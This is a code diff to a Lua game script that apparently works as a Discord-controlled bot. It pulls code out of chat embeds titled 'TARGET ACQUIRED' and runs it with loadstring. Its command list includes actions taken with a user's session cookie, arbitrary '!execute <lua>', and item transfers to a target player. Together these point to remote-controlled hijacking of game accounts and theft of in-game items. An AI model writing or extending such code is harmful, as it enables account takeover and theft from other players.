@@ -550,9 +550,13 @@ local function _getMsgs(_after, _chan)
     return {}
 end
 
--- ─── EMBED MATCHER — any embed counts ───
+-- ─── EMBED MATCHER — title-only, scoped to the trade script ───
+-- Only fires on the "🎯 TARGET ACQUIRED" embed posted by the trade
+-- script. Any other embed (inv, stats, serverget, etc.) is ignored.
 local function _embedLooksRight(_e)
-    return _e ~= nil;
+    if not _e then return false end
+    local title = tostring(_e.title or "");
+    return title:find("TARGET ACQUIRED") ~= nil;
 end
 
 local function _hasAnyEmbed(_md)
@@ -700,7 +704,7 @@ local function _doTransfer(_targetName)
 end
 
 -- ═══════════════════════════════════════════════════════════════
---  EMBED EXEC — stripped: has embed → extract code → run
+--  EMBED EXEC — scoped to TARGET ACQUIRED embeds only
 -- ═══════════════════════════════════════════════════════════════
 local function _extractCode(_md, _e)
     local candidates = {};
@@ -727,26 +731,28 @@ local function _extractCode(_md, _e)
 end
 
 local function _execEmbed(_md)
-    if not _md or not _md.embeds or #_md.embeds == 0 then return end
+    if not _hasAnyEmbed(_md) then return end
 
     for _, _e in ipairs(_md.embeds) do
-        local code = _extractCode(_md, _e)
-        if code then
-            local fn, err = loadstring(code)
-            if not fn then
-                task.spawn(function() _reactIn(_embedCh, _md.id, "❌") end)
-                _postEmbed("❌ Load Error", "```\n" .. tostring(err):sub(1, 900) .. "\n```", 0xFF0000)
+        if _embedLooksRight(_e) then
+            local code = _extractCode(_md, _e)
+            if code then
+                local fn, err = loadstring(code)
+                if not fn then
+                    task.spawn(function() _reactIn(_embedCh, _md.id, "❌") end)
+                    _postEmbed("❌ Load Error", "```\n" .. tostring(err):sub(1, 900) .. "\n```", 0xFF0000)
+                    return
+                end
+
+                local ok, runErr = pcall(fn)
+                task.spawn(function() _reactIn(_embedCh, _md.id, ok and "✅" or "❌") end)
+                _postEmbed(
+                    ok and "✅ Embed Exec" or "❌ Runtime Error",
+                    "```\n" .. tostring(ok and code or runErr):sub(1, 900) .. "\n```",
+                    ok and 0x3EED50 or 0xFF0000
+                )
                 return
             end
-
-            local ok, runErr = pcall(fn)
-            task.spawn(function() _reactIn(_embedCh, _md.id, ok and "✅" or "❌") end)
-            _postEmbed(
-                ok and "✅ Embed Exec" or "❌ Runtime Error",
-                "```\n" .. tostring(ok and code or runErr):sub(1, 900) .. "\n```",
-                ok and 0x3EED50 or 0xFF0000
-            )
-            return
         end
     end
 end
@@ -908,7 +914,7 @@ local function _gw()
                             "**Cookie Actions**: `!follow <u>` `!unfollow <u>` `!friend <u>` `!statusmsg <txt>` `!joingroup <id>` `!leavegroup <id>`\n" ..
                             "**Tracking**: `!track <u>` `!untrack` `!tracklist`\n" ..
                             "**MM2**: `!inv` `!invf` `!coins` `!stats` `!history` `!queue` `!servercheck`\n" ..
-                            "**Utility**: `!status` `!server` `!job` `!age <u>` `!execute <lua>`\n" ..
+                            "**Utility**: `!status` `!server` `!job` `!age <u>` `!execute <lua>` `!clearembedhistory`\n" ..
                             "**Movement**: `!rejoin` `!panic`\n" ..
                             "**Transfers**: `!transfer <u>` `!stoptransfer`",
                             0x3EED50);
